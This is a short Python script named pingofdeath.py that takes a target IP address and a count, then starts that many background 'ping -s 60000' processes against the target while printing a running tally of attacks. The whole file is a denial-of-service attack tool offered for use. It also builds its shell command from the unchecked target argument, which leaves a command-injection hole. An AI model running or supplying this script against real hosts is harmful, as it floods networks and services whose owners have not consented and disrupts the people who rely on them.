import os
import sys
import time

# pingofdeath.py [target_ip] [attack try number]

target = sys.argv[1]
try_number = int(sys.argv[2])
now_number = 0

for num in range(1,try_number+1):
    print("Ping of Death Attacking Now : [%d]"%num)
    os.popen('ping -s 60000 %s >/dev/null &'%target).read()
    now_number += 1

while True:
    print("Total Attack Number Now : %d"%now_number)
    print("Stop : Ctrl + C")
    time.sleep(100000)
